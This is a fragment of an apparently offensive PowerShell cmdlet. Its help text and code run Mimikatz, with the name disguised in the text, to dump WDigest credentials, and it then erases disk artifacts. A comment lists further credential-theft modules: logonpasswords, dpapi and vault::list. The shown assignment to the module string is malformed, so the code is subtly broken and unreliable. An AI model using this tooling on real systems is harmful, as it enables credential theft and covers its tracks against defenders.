...
.NOTES
   ...
   with -manycats switch, if invoked -WDigest 'true' with -manycats switch then cmdlet will
   execute 'M[i]mika[t]z.exe sekurlsa::wdigest exit' and automatic clean old disk artifacts. 
...
.Parameter Module
   ...
   Remark: this function requires -WDigest 'true' and -manycats parameters
...
If($ManyCats.IsPresent)
{
   ...
   If($Wdigest -Match '^(true)$')
   {
      ...
      # net::group sekurlsa::wdigest sekurlsa::logonpasswords sekurlsa::dpapi vault::list exit
      If($Module -Match '^(false)$')
      {
         $Module = "sekurlsa::wdigest exit)$')"
      }
